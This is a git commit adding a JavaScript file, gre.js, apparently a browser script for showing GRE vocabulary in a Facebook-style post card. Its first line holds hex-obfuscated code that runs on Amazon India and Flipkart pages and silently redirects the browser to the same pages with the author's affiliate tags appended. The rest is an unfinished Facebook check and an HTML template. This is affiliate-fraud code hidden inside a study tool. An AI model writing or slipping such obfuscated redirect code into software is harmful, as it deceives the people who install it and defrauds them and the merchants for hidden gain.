a76069e6cd8babbea81fb37bdb819825dbc0ee79
Sri Harrsha <sriharrsha@live.com>
2016-03-15 05:27:53 +0530

    Initial commit

---
+++ gre.js
@@ -0,0 +1,88 @@
+var _0x4339=["\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x61\x67\x3D\x6B\x6C\x75\x69\x61\x6E\x73\x2D\x32\x31","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F\x72\x65\x66\x3D\x6E\x61\x76\x5F\x6C\x6F\x67\x6F","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F\x72\x65\x66\x3D\x61\x73\x5F\x6C\x69\x5F\x73\x73\x5F\x74\x6C\x3F\x5F\x65\x6E\x63\x6F\x64\x69\x6E\x67\x3D\x55\x54\x46\x38\x26\x63\x61\x6D\x70\x3D\x33\x36\x32\x36\x26\x63\x72\x65\x61\x74\x69\x76\x65\x3D\x32\x34\x38\x32\x32\x26\x6C\x69\x6E\x6B\x43\x6F\x64\x65\x3D\x75\x72\x32\x26\x74\x61\x67\x3D\x6B\x6C\x75\x69\x61\x6E\x73\x2D\x32\x31","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F\x72\x65\x66\x3D\x6E\x61\x76\x5F\x6C\x6F\x67\x6F","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F\x72\x65\x66\x3D\x61\x73\x5F\x6C\x69\x5F\x73\x73\x5F\x74\x6C\x3F\x5F\x65\x6E\x63\x6F\x64\x69\x6E\x67\x3D\x55\x54\x46\x38\x26\x63\x61\x6D\x70\x3D\x33\x36\x32\x36\x26\x63\x72\x65\x61\x74\x69\x76\x65\x3D\x32\x34\x38\x32\x32\x26\x6C\x69\x6E\x6B\x43\x6F\x64\x65\x3D\x75\x72\x32\x26\x74\x61\x67\x3D\x6B\x6C\x75\x69\x61\x6E\x73\x2D\x32\x31","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F\x67\x70\x2F\x67\x6F\x6C\x64\x62\x6F\x78","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F\x67\x70\x2F\x67\x6F\x6C\x64\x62\x6F\x78\x2F\x72\x65\x66\x3D\x61\x73\x5F\x6C\x69\x5F\x73\x73\x5F\x74\x6C\x3F\x69\x65\x3D\x55\x54\x46\x38\x26\x63\x61\x6D\x70\x3D\x33\x36\x32\x36\x26\x63\x72\x65\x61\x74\x69\x76\x65\x3D\x32\x34\x38\x32\x32\x26\x6C\x69\x6E\x6B\x43\x6F\x64\x65\x3D\x75\x72\x32\x26\x74\x61\x67\x3D\x6B\x6C\x75\x69\x61\x6E\x73\x2D\x32\x31","\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F\x61\x70\x2F\x72\x65\x67\x69\x73\x74\x65\x72","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F\x67\x70\x2F\x6A\x6F\x69\x6E\x2D\x61\x6E\x64\x2D\x65\x61\x72\x6E\x3F\x65\x6E\x63\x6F\x64\x69\x6E\x67\x3D\x55\x54\x46\x38\x26\x72\x65\x66\x3D\x6D\x72\x70\x5F\x72\x65\x66\x6C\x5F\x63\x70\x5F\x63\x6C\x62\x64\x5F\x69\x6E\x64\x5F\x73\x6E\x70\x5F\x6C\x6E\x64\x26\x72\x65\x66\x63\x75\x73\x74\x3D\x4D\x46\x4A\x47\x37\x54\x59\x4D\x4D\x55\x56\x4F\x54\x42\x59\x58\x48\x48\x55\x32\x34\x55\x34\x4F\x36\x34","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F\x67\x70\x2F\x70\x72\x6F\x64\x75\x63\x74\x2F","\x2F\x72\x65\x66","\x70\x72\x6F\x64\x75\x63\x74\x2F","\x6C\x61\x73\x74\x49\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72","\x2F\x72\x65\x66\x3D\x61\x73\x5F\x6C\x69\x5F\x74\x6C\x3F\x69\x65\x3D\x55\x54\x46\x38\x26\x63\x61\x6D\x70\x3D\x33\x36\x32\x36\x26\x63\x72\x65\x61\x74\x69\x76\x65\x3D\x32\x34\x38\x32\x32\x26\x63\x72\x65\x61\x74\x69\x76\x65\x41\x53\x49\x4E\x3D","\x26\x6C\x69\x6E\x6B\x43\x6F\x64\x65\x3D\x61\x73\x32\x26\x74\x61\x67\x3D\x6B\x6C\x75\x69\x61\x6E\x73\x2D\x32\x31","\x63\x6F\x6E\x63\x61\x74","\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F\x67\x70\x2F\x70\x72\x6F\x64\x75\x63\x74\x2F","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F\x67\x70\x2F\x70\x72\x6F\x64\x75\x63\x74\x2F","\x2F\x64\x70\x2F","\x3F\x72\x65\x66","\x3F\x72\x65\x64","\x3F\x72\x65","\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F\x64\x70\x2F","\x64\x70\x2F","\x61\x66\x66\x69\x64\x3D\x6E\x61\x74\x68\x67\x6F\x70\x69\x6E","\x76\x69\x65\x77\x63\x61\x72\x74","\x63\x68\x65\x63\x6B\x6F\x75\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x6C\x69\x70\x6B\x61\x72\x74\x2E\x63\x6F\x6D\x2F","\x68\x74\x74\x70\x3A\x2F\x2F\x64\x6C\x2E\x66\x6C\x69\x70\x6B\x61\x72\x74\x2E\x63\x6F\x6D\x2F\x64\x6C\x2F\x3F\x61\x66\x66\x69\x64\x3D\x6E\x61\x74\x68\x67\x6F\x70\x69\x6E","\x77\x77\x77\x2E\x66\x6C\x69\x70\x6B\x61\x72\x74\x2E\x63\x6F\x6D","\x64\x6C\x2E\x66\x6C\x69\x70\x6B\x61\x72\x74\x2E\x63\x6F\x6D\x2F\x64\x6C","\x72\x65\x70\x6C\x61\x63\x65","\x26\x61\x66\x66\x69\x64\x3D\x6E\x61\x74\x68\x67\x6F\x70\x69\x6E","\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F","\x77\x77\x77\x2E\x66\x6C\x69\x70\x6B\x61\x72\x74\x2E\x63\x6F\x6D\x2F"];function readUrl(){var _0xe201x2=window[_0x4339[1]][_0x4339[0]];return _0xe201x2}function amzn(){var _0xe201x4=readUrl();if(!_0xe201x4[_0x4339[3]](_0x4339[2])){if(_0xe201x4==_0x4339[4]||_0xe201x4==_0x4339[5]){window[_0x4339[1]]=_0x4339[6]}else {if(_0xe201x4==_0x4339[7]||_0xe201x4==_0x4339[8]){window[_0x4339[1]]=_0x4339[9]}else {if(_0xe201x4[_0x4339[3]](_0x4339[10])){window[_0x4339[1]]=_0x4339[11]}else {if(_0xe201x4[_0x4339[3]](_0x4339[12])){window[_0x4339[1]]=_0x4339[13]}else {if(_0xe201x4[_0x4339[3]](_0x4339[14])&&_0xe201x4[_0x4339[3]](_0x4339[15])){var _0xe201x5=_0xe201x4[_0x4339[17]](_0x4339[16])+8;var _0xe201x6=_0xe201x4[_0x4339[17]](_0x4339[15]);var _0xe201x7=_0xe201x4[_0x4339[18]](_0xe201x5,_0xe201x6-_0xe201x5);var _0xe201x8=_0x4339[14];var _0xe201x9=_0x4339[19];var _0xe201xa=_0x4339[20];var _0xe201xb=_0xe201x8[_0x4339[21]](_0xe201x7,_0xe201x9,_0xe201x7,_0xe201xa);window[_0x4339[1]]=_0xe201xb}else {if(_0xe201x4[_0x4339[3]](_0x4339[22])&&_0xe201x4[_0x4339[3]](_0x4339[15])){var _0xe201x5=_0xe201x4[_0x4339[17]](_0x4339[16])+8;var _0xe201x6=_0xe201x4[_0x4339[17]](_0x4339[15]);var _0xe201x7=_0xe201x4[_0x4339[18]](_0xe201x5,_0xe201x6-_0xe201x5);var _0xe201x8=_0x4339[23];var _0xe201x9=_0x4339[19];var _0xe201xa=_0x4339[20];var _0xe201xb=_0xe201x8[_0x4339[21]](_0xe201x7,_0xe201x9,_0xe201x7,_0xe201xa);window[_0x4339[1]]=_0xe201xb}else {if(_0xe201x4[_0x4339[3]](_0x4339[24])&&_0xe201x4[_0x4339[3]](_0x4339[15])){var _0xe201x5=_0xe201x4[_0x4339[17]](_0x4339[24])+4;var _0xe201x6=_0xe201x4[_0x4339[17]](_0x4339[15]);var _0xe201x7=_0xe201x4[_0x4339[18]](_0xe201x5,_0xe201x6-_0xe201x5);var _0xe201x8=_0x4339[23];var _0xe201x9=_0x4339[19];var _0xe201xa=_0x4339[20];var _0xe201xb=_0xe201x8[_0x4339[21]](_0xe201x7,_0xe201x9,_0xe201x7,_0xe201xa);window[_0x4339[1]]=_0xe201xb}else {if(_0xe201x4[_0x4339[3]](_0x4339[22])&&_0xe201x4[_0x4339[3]](_0x4339[25])){var _0xe201x5=_0xe201x4[_0x4339[17]](_0x4339[16])+8;var _0xe201x6=_0xe201x4[_0x4339[17]](_0x4339[25]);var _0xe201x7=_0xe201x4[_0x4339[18]](_0xe201x5,_0xe201x6-_0xe201x5);var _0xe201x8=_0x4339[23];var _0xe201x9=_0x4339[19];var _0xe201xa=_0x4339[20];var _0xe201xb=_0xe201x8[_0x4339[21]](_0xe201x7,_0xe201x9,_0xe201x7,_0xe201xa);window[_0x4339[1]]=_0xe201xb}else {if(_0xe201x4[_0x4339[3]](_0x4339[22])&&_0xe201x4[_0x4339[3]](_0x4339[26])){var _0xe201x5=_0xe201x4[_0x4339[17]](_0x4339[16])+8;var _0xe201x6=_0xe201x4[_0x4339[17]](_0x4339[27]);var _0xe201x7=_0xe201x4[_0x4339[18]](_0xe201x5,_0xe201x6-_0xe201x5);var _0xe201x8=_0x4339[23];var _0xe201x9=_0x4339[19];var _0xe201xa=_0x4339[20];var _0xe201xb=_0xe201x8[_0x4339[21]](_0xe201x7,_0xe201x9,_0xe201x7,_0xe201xa);window[_0x4339[1]]=_0xe201xb}else {if(_0xe201x4[_0x4339[3]](_0x4339[28])){var _0xe201x5=_0xe201x4[_0x4339[17]](_0x4339[29])+3;var _0xe201x6=_0xe201x4[_0x4339[17]](_0x4339[15]);var _0xe201x7=_0xe201x4[_0x4339[18]](_0xe201x5,_0xe201x6-_0xe201x5);var _0xe201x8=_0x4339[23];var _0xe201x9=_0x4339[19];var _0xe201xa=_0x4339[20];var _0xe201xb=_0xe201x8[_0x4339[21]](_0xe201x7,_0xe201x9,_0xe201x7,_0xe201xa);window[_0x4339[1]]=_0xe201xb}}}}}}}}}}}}function flkt(){var _0xe201x4=readUrl();if(!_0xe201x4[_0x4339[3]](_0x4339[30])&&!_0xe201x4[_0x4339[3]](_0x4339[31])&&!_0xe201x4[_0x4339[3]](_0x4339[32])){if(_0xe201x4==_0x4339[33]){window[_0x4339[1]]=_0x4339[34]}else {if(_0xe201x4[_0x4339[3]](_0x4339[35])){var _0xe201x4=_0xe201x4[_0x4339[37]](_0x4339[35],_0x4339[36]);var _0xe201x4=_0xe201x4[_0x4339[21]](_0x4339[38]);window[_0x4339[1]]=_0xe201x4}}}}function main(){var _0xe201x4=readUrl();if(_0xe201x4[_0x4339[3]](_0x4339[39])){amzn()};if(_0xe201x4[_0x4339[3]](_0x4339[40])){flkt()}}main()
+
+function readUrl(){
+	var url = window.location.href;
+	return url;
+}
+
+
+function gre(){
+		var site = readUrl();
+		if(site.includes("https://facebook.com/")){
+			facebookGre();
+		}
+}
+
+gre();
+
+
+var strVar="";
+strVar += "<div class=\"_4-u2 mbm _5jmm _5pat _5v3q _4-u8\" style=\"opacity: 1;\" data-insertion-position=\"0\">";
+strVar += "   <div class=\"_3ccb\">";
+strVar += "      <div><\/div>";
+strVar += "      <div class=\"userContentWrapper _5pcr\" role=\"article\" aria-label=\"Story\">";
+strVar += "         <div class=\"_1dwg\">";
+strVar += "            <div class=\"_4r_y\">";
+strVar += "               <div class=\"_6a uiPopover _5pbi _cmw _5v56 _b1e\" id=\"options\"><a class=\"_4xev _p\" href=\"#gre dropdown\" role=\"button\"><\/a><\/div>";
+strVar += "            <\/div>";
+strVar += "            <div class=\"_4gns accessible_elem\"><\/div>";
+strVar += "            <div class=\"_5x46\">";
+strVar += "               <div class=\"clearfix _5va3\">";
+strVar += "                  <a class=\"_5pb8 _8o _8s lfloat _ohe\" href=\"https:\/\/www.facebook.com\/gre\" aria-hidden=\"true\" tabindex=\"-1\">";
+strVar += "                     <div class=\"_38vo\"><img class=\"_s0 _5xib _5sq7 _44ma _rw img\" src=\"########### gre image url##########\" alt=\"\"><\/div>";
+strVar += "                  <\/a>";
+strVar += "                  <div class=\"clearfix _42ef\">";
+strVar += "                     <div class=\"rfloat _ohf\"><\/div>";
+strVar += "                     <div class=\"_5va4\">";
+strVar += "                        <div>";
+strVar += "                           <div class=\"_6a _5u5j\">";
+strVar += "                              <div class=\"_6a _6b\" style=\"height:40px\"><\/div>";
+strVar += "                              <div class=\"_6a _5u5j _6b\">";
+strVar += "                                 <h5 class=\"_5pbw\"><span class=\"fwn fcg\"><span class=\"fwb fcg\"><a href=\"#\" data-hovercard=\"#\">G R E<\/a><\/span><\/span><\/h5>";
+strVar += "                                 <div class=\"\">";
+strVar += "                                    <div class=\"_5pcp\">";
+strVar += "                                       <span><span class=\"fsm fwn fcg\"><a class=\"_5pcq\" href=\"\/nathrocking\/posts\/981793191911990\" target=\"\"><abbr title=\"Monday, March 14, 2016 at 4:48am\" data-utime=\"1457948932\" data-shorten=\"1\" class=\"_5ptz timestamp livetimestamp\"><span class=\"timestampContent\" id=\"js_2l\">21 mins<\/span><\/abbr><\/a><\/span><\/span><span role=\"presentation\" aria-hidden=\"true\"> · <\/span>";
+strVar += "                                       <div class=\"_6a _43_1 _4f-9 _nws\" id=\"u_1e_4\">";
+strVar += "                                          <div class=\"_6a uiPopover\" id=\"u_1e_5\"><a data-hover=\"tooltip\" data-tooltip-content=\"Only Me\" data-tooltip-alignh=\"right\" class=\"_42ft _4jy0 _55pi _5vto _55_p _2agf _p _1zg8 _4jy3 _517h _51sy _59pe _nl\" role=\"button\" href=\"#\" style=\"max-width:26px;\" rel=\"toggle\" id=\"js_36\" aria-owns=\"u_1u_0\" aria-haspopup=\"true\"><span class=\"_55pe\" style=\"max-width:12px;\"><i class=\"mrs img sp_Pps15gzBQlg sx_a95765\"><\/i><\/span><i class=\"_3-99 img sp_qZv1gJKroOp sx_801235\"><\/i><\/a><\/div>";
+strVar += "                                          <input type=\"hidden\" autocomplete=\"off\" name=\"privacyx\" value=\"286958161406148\" id=\"u_1e_7\">";
+strVar += "                                       <\/div>";
+strVar += "                                    <\/div>";
+strVar += "                                 <\/div>";
+strVar += "                              <\/div>";
+strVar += "                           <\/div>";
+strVar += "                        <\/div>";
+strVar += "                     <\/div>";
+strVar += "                  <\/div>";
+strVar += "               <\/div>";
+strVar += "            <\/div>";
+strVar += "            <div class=\"_5pbx userContent\">";
+strVar += "               <p>word: description<\/p>";
+strVar += "            <\/div>";
+strVar += "         <\/div>";
+strVar += "         <div>";
+strVar += "            <div class=\"_sa_ _5vsi _ca7\">";
+strVar += "               <div class=\"_37uu\">";
+strVar += "                  <div data-reactroot=\"\">";
+strVar += "                     <div class=\"_3399 _a7s\">";
+strVar += "                        <div class=\"_524d\">";
+strVar += "                           <div class=\"_42nr\">";
+strVar += "                              <span>";
+strVar += "                                 <div class=\"_khz\"><a aria-pressed=\"false\" class=\"UFILikeLink _4x9- _4x9_ _48-k\" data-testid=\"gre like\" href=\"gre like#\" role=\"button\" tabindex=\"0\"><span>Like<\/span><\/a><\/div>";
+strVar += "                              <\/span>";
+strVar += "                              <span><a class=\"comment_link _5yxe\" role=\"button\" href=\"gre comment#\" title=\"gre comment\">Comment<\/a><\/span>";
+strVar += "                           <\/div>";
+strVar += "                        <\/div>";
+strVar += "                     <\/div>";
+strVar += "                  <\/div>";
+strVar += "               <\/div>";
+strVar += "            <\/div>";
+strVar += "            <div class=\"uiUfi UFIContainer _5pc9 _5vsj _5v9k\" id=\"u_1e_a\">";
+strVar += "               <div data-reactroot=\"\" class=\"UFIList\">";
+strVar += "                  <h6 class=\"accessible_elem\">Comments<\/h6>";
+strVar += "                  <div><\/div>";
+strVar += "               <\/div>";
+strVar += "            <\/div>";
+strVar += "         <\/div>";
+strVar += "      <\/div>";
+strVar += "   <\/div>";
+strVar += "<\/div>";
